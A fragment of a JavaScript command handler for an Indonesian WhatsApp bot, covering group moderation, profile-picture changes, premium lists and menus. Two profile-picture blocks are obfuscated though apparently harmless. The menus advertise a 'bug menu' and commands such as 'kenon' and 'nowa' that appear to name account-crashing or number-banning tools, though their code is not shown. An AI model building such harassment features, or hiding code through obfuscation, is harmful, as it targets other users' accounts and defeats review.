case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
haikalgans = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await haikal.sendMessage(from, { audio: haikalgans, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
//=================================================//
       case 'group': case 'grup': {       
       
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (args[0] === 'close'){
    await haikal.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
    await haikal.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
haikal.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Group Open
Group Close`}, { quoted: m }) 
     }
    }
    break
//=================================================//
    case 'editinfo': {
    if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
     if (args[0] === 'open'){
await haikal.groupSettingUpdate(from, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
     } else if (args[0] === 'close'){
await haikal.groupSettingUpdate(from, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
     } else {
     haikal.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Editinfo Open
Editinfo Close`}, { quoted: m }) 

    }
    }
    break
//=================================================//
    case 'join': {
    if (!isCreator) return m.reply(mess.owner)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
m.reply('Sabar Cuy Loading')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await haikal.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
    }
    break
//=================================================//
case 'setppbot': {
if (!isCreator) return m.reply(mess.owner)
m.reply('Sabar Cuy Loading')
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
var _0x1c413d=_0x2a1c;(function(_0x477de5,_0x25404c){var _0xc6ef35=_0x2a1c,_0x1a86a3=_0x477de5();while(!![]){try{var _0x392e78=parseInt(_0xc6ef35(0xff))/0x1+-parseInt(_0xc6ef35(0xfc))/0x2+-parseInt(_0xc6ef35(0xf9))/0x3*(parseInt(_0xc6ef35(0xfe))/0x4)+parseInt(_0xc6ef35(0x103))/0x5*(parseInt(_0xc6ef35(0x100))/0x6)+parseInt(_0xc6ef35(0x105))/0x7+parseInt(_0xc6ef35(0x108))/0x8+-parseInt(_0xc6ef35(0x102))/0x9*(parseInt(_0xc6ef35(0xfd))/0xa);if(_0x392e78===_0x25404c)break;else _0x1a86a3['push'](_0x1a86a3['shift']());}catch(_0x4aa4a8){_0x1a86a3['push'](_0x1a86a3['shift']());}}}(_0x512f,0x3121c));var media=await haikal[_0x1c413d(0x10a)](quoted);function _0x2a1c(_0x26455a,_0x1953ac){var _0x512fee=_0x512f();return _0x2a1c=function(_0x2a1c5a,_0x267fa3){_0x2a1c5a=_0x2a1c5a-0xf8;var _0xfaa61b=_0x512fee[_0x2a1c5a];return _0xfaa61b;},_0x2a1c(_0x26455a,_0x1953ac);}try{if(args[0x0]==_0x1c413d(0xfa)){const {generateProfilePicture}=require('./baseikal/lib/myfunc');var {img}=await generateProfilePicture(media);await haikal[_0x1c413d(0x106)]({'tag':'iq','attrs':{'to':botNumber,'type':'set','xmlns':_0x1c413d(0x107)},'content':[{'tag':_0x1c413d(0xf8),'attrs':{'type':_0x1c413d(0xfb)},'content':img}]});}else await haikal[_0x1c413d(0x101)](botNumber,{'url':media});m['reply'](mess[_0x1c413d(0x109)]);}catch{m[_0x1c413d(0x104)]('Gagal\x20Mengganti\x20Photo\x20Profile');}function _0x512f(){var _0x2f232f=['reply','1286194bdHKgR','query','w:profile:picture','3088072VzwWid','success','downloadAndSaveMediaMessage','picture','153igiZJi','/full','image','720650VaxDBN','2205790rCEybd','5796etOiDI','80334lizMjF','6GdpecB','updateProfilePicture','9DZAUSC','1029810dkCbDi'];_0x512f=function(){return _0x2f232f;};return _0x512f();}
}
break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
m.reply('Sabar Cuy Loading')
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
const _0x3c52ee=_0x4109;(function(_0x1a4f9f,_0x3819cc){const _0x5c4a67=_0x4109,_0x4d0e21=_0x1a4f9f();while(!![]){try{const _0x2fe536=-parseInt(_0x5c4a67(0x78))/0x1+parseInt(_0x5c4a67(0x7a))/0x2*(-parseInt(_0x5c4a67(0x7e))/0x3)+parseInt(_0x5c4a67(0x73))/0x4+parseInt(_0x5c4a67(0x7c))/0x5+-parseInt(_0x5c4a67(0x72))/0x6+parseInt(_0x5c4a67(0x76))/0x7+parseInt(_0x5c4a67(0x70))/0x8;if(_0x2fe536===_0x3819cc)break;else _0x4d0e21['push'](_0x4d0e21['shift']());}catch(_0x3ccaac){_0x4d0e21['push'](_0x4d0e21['shift']());}}}(_0x38ce,0x9724c));function _0x4109(_0x2b2147,_0x340f6c){const _0x38ce6f=_0x38ce();return _0x4109=function(_0x410966,_0x2335d5){_0x410966=_0x410966-0x6d;let _0xbe9a92=_0x38ce6f[_0x410966];return _0xbe9a92;},_0x4109(_0x2b2147,_0x340f6c);}let media=await haikal['downloadAndSaveMediaMessage'](quoted);function _0x38ce(){const _0x2fbc7e=['43773HHkTHV','w:profile:picture','./baseikal/lib/myfunc','chat','10418328MFCmiM','reply','6441450CkyNxQ','1458440XVIgpe','set','picture','4984819pxHUxY','/full','786695iyptWU','query','142qiVRKp','image','5681485dynfLf','Gagal\x20Mengganti\x20Photo\x20Profile'];_0x38ce=function(){return _0x2fbc7e;};return _0x38ce();}try{if(args[0x0]==_0x3c52ee(0x77)){const {generateProfilePicture}=require(_0x3c52ee(0x6e));var {img}=await generateProfilePicture(media);await haikal[_0x3c52ee(0x79)]({'tag':'iq','attrs':{'to':m[_0x3c52ee(0x6f)],'type':_0x3c52ee(0x74),'xmlns':_0x3c52ee(0x6d)},'content':[{'tag':_0x3c52ee(0x75),'attrs':{'type':_0x3c52ee(0x7b)},'content':img}]});}else await haikal['updateProfilePicture'](m[_0x3c52ee(0x6f)],{'url':media});m[_0x3c52ee(0x71)](mess['success']);}catch{m['reply'](_0x3c52ee(0x7d));}
}
break
//=================================================//
case 'block': {
if (!isCreator) return m.reply(mess.owner)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return m.reply(mess.owner)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setname': case 'setsubject': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text ?'
await haikal.groupUpdateSubject(from, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setdesc': case 'setdesk': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text Nya ?'
await haikal.groupUpdateDescription(from, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break

//=================================================//
case 'once': case 'toonce': { 
if (!isCreator) return m.reply(mess.owner)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(from, {image: {url: anu},viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(from, {video: {url: anu},viewOnce : true},{quoted: m })
}
}
break
//=================================================//
case 'ss': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Example : ${prefix + command} Url`
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
buf = await getBuffer(anu.screenshot) 
haikal.sendMessage(from, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted:m }).catch((err) => m.reply(jsonformat('*LINK NYA SLUR*')))
}
break
//=================================================//
case 'searchgroups':
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`Example: ${prefix}searchgroups hacker`)
mel.linkwa(q)
.then(result => {
let res = '❰ *WHATSAPP GROUP LINKS* ❱\n\n'
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
m.reply(res)
});
break
//=================================================//
case 'kick': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(from, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//

case 'add': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(from, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'promote': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(from, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'demote': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(from, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

//=================================================//
case 'setcmd': {
if (!isCreator) return m.reply(mess.owner)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
m.reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isCreator) return m.reply(mess.owner)
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
m.reply(`Done!`)
}
break
//=================================================//
case 'public': {
if (!isCreator) return m.reply(mess.owner)
haikal.public = true
m.reply('Sukse Change To Public')
}
break
//=================================================//
case 'self': {
if (!isCreator) return m.reply(mess.owner)
haikal.public = false
m.reply('Sukses Change To Self')
}
break
case 'listcmd': {
if (!isCreator) return m.reply(mess.owner)
let teks = `
*List Cmd Sticker*
${Object.entries(global.db.data.sticker).map(([key, value], index) => `True : ${value.text}`).join('\n')}
`.trim()
haikal.sendText(from, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'antilink': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'addprem':
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await haikal.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`Nomor ${bnnd} Telah Sudah Premium!!!`)
break
case 'delprem':
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
yaki = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`Nomor ${yaki} Telah Di Hapus Dari Premium!!!`)
break
case 'listprem':
teksooo = '*List Premium*\n\n'
for (let i of owner) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${owner.length}*`
haikal.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": owner } })
break
//=================================================//
//=================================================//
case 'owner': case 'crator':{
haikal.sendContact(from, global.owner, m)
}
break
case 'welcome': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('khusus group')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome  di group ini')
} else {
haikal.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Welcome on
Welcome off`}, { quoted: m }) 
}
}
break
case 'antitoxic': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('khusus group')
if (args[0] === "on") {
if (welcmm) return m.reply('Sudah Aktif')
wlcmm.push(from)
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcmm) return m.reply('Sudah Non Aktif')
let off = wlcmm.indexOf(from)
wlcmm.splice(off, 1)
m.reply('Sukses Mematikan Anti Toxic  di group ini')
} else {
haikal.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Antitoxic on
Antitoxic off`}, { quoted: m }) 
}
}
break
//=================================================//
case 'ping': {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}
` }, { quoted: m })
}
break
case 'menu': {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

${menu}` }, { quoted: m })
}
break
case 'bugmenu': {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

${bugmenu}` }, { quoted: m })
}
break
case 'allmenu': {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

${allmenu}` }, { quoted: m })
}
break
case 'textmaker': {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

${textmaker}` }, { quoted: m })
}
break
case 'gamemenu': {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

tebak kata
tebak gambar
tebak lirik
tebak kalimat
tebak lagu
tebak lontong
family100
kuismath noob
kuismath easy
kuismath medium
kuismath hard
kuismath extreme
kuismath impossible
kuismath impossible2` }, { quoted: m })
}
break
case 'downloadmenu': {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

*ʙᴏᴛ ʜᴡ ᴍᴏᴅꜱ ᴡᴀ ᴠ16*
┏━━⊱
┣❏ꜰʙᴠɪᴅᴇᴏ (ʟɪɴᴋɴʏᴀ)
┣❏ɪɢᴠɪᴅᴇᴏ (ʟɪɴᴋɴʏᴀ)
┣❏ᴛᴡɪᴛᴠɪᴅᴇᴏ (ʟɪɴᴋɴʏᴀ)
┣❏ᴍᴇᴅɪᴀꜰɪʀᴇ (ʟɪɴᴋɴʏᴀ)
┣❏ᴛɪᴋᴛᴏᴋᴠɪᴅᴇᴏ (ʟɪɴᴋɴʏᴀ)
┣❏ᴛɪᴋᴛᴏᴋᴀᴜᴅɪᴏ (ʟɪɴᴋɴʏᴀ)
┣❏ᴘʟᴀʏ (ᴛᴇxᴛɴʏᴀ)
┣❏ꜱᴍᴇᴍᴇ (ɢᴀᴍʙᴀʀɴʏᴀ)
┣❏ʏᴛᴍᴘ4 (ʟɪɴᴋɴʏᴀ)
┣❏ʏᴛᴍᴘ3 (ʟɪɴᴋɴʏᴀ)
┣❏ᴘɪɴᴛᴇʀᴇꜱᴛ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴄᴏᴜᴘʟᴇ (Qᴜᴇʀʏ)
┣❏ᴄᴏꜰꜰᴇ (Qᴜᴇʀʏ)
┗━━⊱` }, { quoted: m })
}
break
case 'ownermenu': {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

*ʙᴏᴛ ʜᴡ ᴍᴏᴅꜱ ᴡᴀ ᴠ16*
┏━━⊱
┣❏ɴᴏᴡᴀ (628xxx)
┣❏ᴠᴇʀɪꜰ@ (628xxx)
┣❏ᴋᴇɴᴏɴ (628xxx)
┣❏ᴀᴅᴅᴘʀᴇᴍ (628xxx)
┣❏ᴅᴇʟᴘʀᴇᴍ (628xxx)
┣❏ꜱᴇᴛᴘᴘʙᴏᴛ (ɢᴀᴍʙᴀʀɴʏᴀ)
┣❏ʙʟᴏᴄᴋ (ʀᴇᴘʟʏ ᴏʀᴀɴɢ ɴʏᴀ)
┣❏ᴜɴʙʟᴏᴄᴋ (ʀᴇᴘʟʏ ᴏʀᴀɴɢ ɴʏᴀ)
┣❏ꜱᴇᴛᴀᴅᴍɪɴ (Qᴜᴇʀʏ)
┣❏ꜱᴇᴛᴄᴍᴅ (ʀᴇᴘʟʏ ꜱᴛɪᴄᴋᴇʀ ɴʏᴀ)
┣❏ᴅᴇʟᴄᴍᴅ (ʀᴇᴘʟʏ ꜱᴛɪᴄᴋᴇʀ ɴʏᴀ)
┣❏ɴꜱꜰᴡ (ᴏɴ/ᴏꜰꜰ)
┣❏ᴀᴅᴅᴀᴘᴋ (ʀᴇᴘʟʏ ᴀᴘᴋ ɴʏᴀ)
┣❏ᴅᴇʟᴀᴘᴋ (ʀᴇᴘʟʏ ᴀᴘᴋ ɴʏᴀ)
┣❏ᴀᴅᴅᴢɪᴘ (ʀᴇᴘʟʏ ᴢɪᴘ ɴʏᴀ)
┣❏ᴅᴇʟᴢɪᴘ (ʀᴇᴘʟʏ ᴢɪᴘ ɴʏᴀ)
┣❏ᴀᴅᴅᴘᴅꜰ (ʀᴇᴘʟʏ ᴘᴅꜰ ɴʏᴀ)
┣❏ᴅᴇʟᴘᴅꜰ (ʀᴇᴘʟʏ ᴘᴅꜰ ɴʏᴀ)
┣❏ᴀᴅᴅᴠɴ (ʀᴇᴘʟʏ ᴠɴ ɴʏᴀ)
┣❏ᴅᴇʟᴠɴ (ʀᴇᴘʟʏ ᴠɴ ɴʏᴀ)
┣❏ꜱᴇɴᴅᴘᴅꜰ (ʀᴇᴘʟʏ ᴏʀᴀɴɢ ɴʏᴀ)
┣❏ꜱᴇɴᴅᴢɪᴘ (ʀᴇᴘʟʏ ᴏʀᴀɴɢ ɴʏᴀ)
┣❏ꜱᴇɴᴅᴀᴘᴋ (ʀᴇᴘʟʏ ᴏʀᴀɴɢ ɴʏᴀ)
┣❏ᴀᴅᴅᴍꜱɢ (ʀᴇᴘʟʏ ᴄʜᴀᴛ ɴʏᴀ)
┣❏ɢᴇᴛᴍꜱɢ (Qᴜᴇʀʏ)
┣❏ᴅᴇʟᴍꜱɢ (ʀᴇᴘʟʏ ᴄʜᴀᴛ ɴʏᴀ)
┣❏ꜱᴇɴᴅʟɪꜱᴛ (ʀᴇᴘʟʏ ᴏʀᴀɴɢ ɴʏᴀ)
┗━━⊱` }, { quoted: m })
}
break
case 'listmenu': {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

*ʙᴏᴛ ʜᴡ ᴍᴏᴅꜱ ᴡᴀ ᴠ16*
┏━━⊱
┣❏ʟɪꜱᴛᴀᴅᴍɪɴ
┣❏ʟɪꜱᴛᴀᴜᴅɪᴏ
┣❏ʟɪꜱᴛʟᴏɢᴏ
┣❏ʟɪꜱᴛᴘʀᴇᴍ
┣❏ʟɪꜱᴛᴡɪʙᴜ
┣❏ʟɪꜱᴛᴠɴ
┣❏ʟɪꜱᴛᴘᴅꜰ
┣❏ʟɪꜱᴛᴢɪᴘ
┣❏ʟɪꜱᴛᴀᴘᴋ
┣❏ʟɪꜱᴛᴘᴄ
┣❏ʟɪꜱᴛɢᴄ
┣❏ʟɪꜱᴛᴍꜱɢ
┣❏ʟɪꜱᴛᴏɴʟɪɴᴇ
┣❏ʟɪꜱᴛᴄᴍᴅ
┗━━⊱` }, { quoted: m })
}
break
case 'groupmenu': {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

*ʙᴏᴛ ʜᴡ ᴍᴏᴅꜱ ᴡᴀ ᴠ16*
┏━━⊱
┣❏ᴋɪᴄᴋ (628xxx)
┣❏ᴀᴅᴅ (628xxx)
┣❏ᴘʀᴏᴍᴏᴛᴇ (628xx)
┣❏ᴅᴇᴍᴏᴛᴇ (628xx)
┣❏ᴋᴜᴅᴇᴛ (628xx)
┣❏ɪɴꜱᴘᴇᴄᴛ (ʟɪɴᴋɴʏᴀ)
┣❏ꜱᴇɴᴅʟɪɴᴋɢᴄ (628xxx)
┣❏ʟɪɴᴋɢʀᴏᴜᴘ
┣❏ʀᴇꜱᴇᴛʟɪɴᴋɢᴄ
┣❏ᴛᴀɢᴀʟʟ (ᴛᴇxᴛɴʏᴀ)
┣❏ʜɪᴅᴇᴛᴀɢ (ᴛᴇxᴛɴʏᴀ)
┣❏ɢʀᴏᴜᴘ (ᴏɴ/ᴏꜰꜰ)
┣❏ꜱᴇᴛɴᴀᴍᴇ (ᴛᴇxᴛɴʏᴀ)
┣❏ꜱᴇᴛᴅᴇꜱᴄ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴇᴅɪᴛɪɴꜰᴏ (ᴏɴ/ᴏꜰꜰ)
┣❏ꜱᴇᴛᴘᴘɢʀᴏᴜᴘ (ɢᴀᴍʙᴀʀɴʏᴀ)
┗━━⊱` }, { quoted: m })
}
break

case 'sewa': {
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Sewa Bot ? Hubungi Admin Untuk Nego Wa.me/6281214281312`)
}
break

//=================================================/
